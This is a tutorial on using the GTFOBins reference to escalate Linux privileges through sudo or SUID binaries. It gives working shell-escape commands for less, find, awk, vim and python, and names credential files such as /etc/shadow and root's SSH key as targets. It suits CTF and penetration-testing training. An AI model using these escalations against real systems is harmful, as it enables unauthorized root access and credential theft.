# Using GTFOBins for Privilege Escalation

GTFOBins is one of the most important resources for Linux privilege escalation. It provides ready-made techniques for abusing legitimate Linux binaries to achieve actions such as spawning shells, reading files, writing files, or escalating privileges.

Website:

```text
https://gtfobins.github.io
```

---

# When Should You Use GTFOBins?

Whenever you enumerate a Linux machine and discover binaries through:

```bash
sudo -l
```

or

```bash
find / -perm -4000 2>/dev/null
```

you may encounter binaries such as:

```text
awk
find
less
tar
vim
nano
nmap
python
```

You might not remember the exact exploitation syntax for every binary.

In such situations, GTFOBins becomes your primary reference.

---

# Step-by-Step: How to Use GTFOBins

Suppose enumeration reveals:

```bash
(root) NOPASSWD: /usr/bin/less
```

Your objective is to escalate privileges using `less`.

---

## Step 1: Search for the Binary

Visit GTFOBins and search for:

```text
less
```

---

## Step 2: Select the Appropriate Exploitation Vector

GTFOBins categorizes exploits according to the available permissions.

Common categories include:

| Function | Usage Scenario |
|----------|----------------|
| Shell | Spawn a shell |
| Sudo | Binary executable via sudo |
| SUID | Binary has SUID bit set |
| File Read | Read protected files |
| File Write | Modify protected files |
| Command | Execute system commands |
| Capabilities | Abuse Linux capabilities |

Since our binary is executable via sudo, we choose:

```text
Sudo
```

---

## Step 3: Execute the Provided Exploit

GTFOBins may provide:

```bash
sudo less /etc/profile
```

Once inside `less`, type:

```bash
!/bin/sh
```

Result:

```bash
# whoami
root
```

---

# Why Does This Work?

`less` is a file viewer.

When executed using:

```bash
sudo less /etc/profile
```

the program runs with root privileges.

Internally, `less` supports shell escapes using:

```bash
!
```

When we execute:

```bash
!/bin/sh
```

a new shell is spawned.

Because `less` itself runs as root, the spawned shell also inherits root privileges.

---

# Common GTFOBins Exploitation Patterns

Although every binary has unique syntax, most GTFOBins techniques fall into one of the following categories.

---

## 1. Direct Shell Execution

Certain binaries can directly execute external commands.

Examples:

```bash
find
awk
nmap (older versions)
tar
```

Examples:

```bash
sudo find . -exec /bin/sh \; -quit
```

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

---

## 2. Interactive Shell Escaping

Many interactive programs provide built-in command execution functionality.

Examples:

```text
less
more
man
vim
nano
```

Examples:

```bash
!/bin/sh
```

or

```vim
:!/bin/bash
```

---

## 3. Language Interpreter Abuse

Programming language interpreters can execute arbitrary system commands.

Examples:

```bash
python
perl
ruby
lua
```

Example:

```bash
sudo python3 -c 'import os; os.system("/bin/sh")'
```

---

# Understanding GTFOBins Function Categories

GTFOBins displays several functionality sections for each binary.

Understanding these categories is essential.

---

# 1. Shell

## Purpose

Spawn an interactive shell.

## Example

```bash
sudo less /etc/hosts
```

Inside `less`:

```bash
!/bin/sh
```

Result:

```text
root shell
```

---

# 2. Command

## Purpose

Execute one or more system commands without necessarily obtaining a full interactive shell.

## Example Use Cases

Execute:

```bash
id
whoami
cat /etc/shadow
```

Some binaries support custom scripts or filters that execute commands automatically.

Example:

```bash
.lessfilter
```

---

# 3. File Read

## Purpose

Read protected files that are inaccessible to normal users.

Common targets:

```text
/etc/shadow
/root/.ssh/id_rsa
/etc/sudoers
```

Example:

```bash
sudo less /etc/shadow
```

---

# 4. File Write

## Purpose

Write or modify files on the system.

Potential abuse:

- Add new users
- Modify configuration files
- Replace SSH keys
- Backdoor cron jobs

Example target:

```bash
/etc/passwd
```

---

# 5. Inherit

## Purpose

Abuse functionality inherited from another program.

Some binaries launch secondary programs.

Example:

Inside `less`:

```text
v
```

opens:

```text
vi
```

Since `vi` supports:

```vim
:!/bin/sh
```

`less` indirectly inherits shell-spawning capabilities.

---

# Multiple Methods in GTFOBins

GTFOBins often lists several exploitation methods labeled as:

```text
A
B
C
```

These are simply alternative techniques.

Example for `less`:

### Method A (Most Common)

```bash
sudo less /etc/hosts
```

Inside:

```bash
!/bin/sh
```

---

### Method B

Abuse:

```bash
LESSOPEN
```

environment variable.

---

### Method C

Abuse:

```bash
VISUAL=/bin/sh
```

environment variable.

---

# Practical Advice

During real-world engagements or CTFs:

1. Always try Method A first.
2. If restrictions prevent exploitation, try Method B or C.
3. Review all available GTFOBins categories because shell access is not always necessary.
4. File read or file write capabilities alone may be sufficient for privilege escalation.

---

# GTFOBins Workflow Summary

```text
Enumeration
      ↓

sudo -l
SUID Enumeration
Capabilities Enumeration

      ↓

Identify Allowed Binary

      ↓

Search Binary on GTFOBins

      ↓

Choose Correct Section
(Sudo / SUID / Capabilities)

      ↓

Execute Exploit

      ↓

Gain Shell or Access Sensitive Data
```

---

# Golden Rule

Whenever you discover an unfamiliar binary during enumeration, immediately check GTFOBins before moving on.

Many privilege escalation paths are missed simply because the attacker does not recognize the binary.
